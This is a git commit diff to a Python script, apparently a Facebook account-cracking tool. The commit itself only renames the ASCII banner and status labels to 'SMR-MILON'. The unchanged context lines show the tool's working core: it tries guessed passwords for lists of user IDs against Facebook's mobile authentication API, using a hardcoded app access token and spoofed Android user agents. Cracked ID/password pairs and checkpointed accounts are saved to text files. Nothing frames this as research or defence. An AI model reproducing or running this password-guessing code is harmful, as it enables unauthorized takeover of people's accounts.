d108758c68e4ffe6d58bd6c5d5ee4f20c125e813
Smr milon <108234691+SMRmilon01@users.noreply.github.com>
2022-06-28 21:24:40 +0600

    Milon.py

--- ahad.py
+++ ahad.py
@@ -389,11 +389,19 @@ def follow(ses,coki):
 
 logo = ("""\033[1;32m
        
-███████      ███      ███       ██████
-██           ██ ██  ██ ██       ██   ██
-███████      ██   ██   ██       ██████
-     ██      ██        ██       ██   ██
-███████  ██  ██        ██  ██   ██   ██ 
+░██████╗░░░███╗░░░███╗░░░██████╗░
+██╔════╝░░░████╗░████║░░░██╔══██╗
+╚█████╗░░░░██╔████╔██║░░░██████╔╝
+░╚═══██╗░░░██║╚██╔╝██║░░░██╔══██╗
+██████╔╝██╗██║░╚═╝░██║██╗██║░░██║
+╚═════╝░╚═╝╚═╝░░░░░╚═╝╚═╝╚═╝░░╚═╝
+
+███╗░░░███╗██╗██╗░░░░░░█████╗░███╗░░██╗
+████╗░████║██║██║░░░░░██╔══██╗████╗░██║
+██╔████╔██║██║██║░░░░░██║░░██║██╔██╗██║
+██║╚██╔╝██║██║██║░░░░░██║░░██║██║╚████║
+██║░╚═╝░██║██║███████╗╚█████╔╝██║░╚███║
+╚═╝░░░░░╚═╝╚═╝╚══════╝░╚════╝░╚═╝░░╚══╝
                                                                                              \033
 __________________×______________________
   
@@ -1259,7 +1267,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [MILON ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ SMR-MILON ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1276,15 +1284,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ MILON-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SMR.MILON-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-MILON-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-SMR.MILON-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ MILON-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SMR.MILON-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-MILON-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-SMR.MILON-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
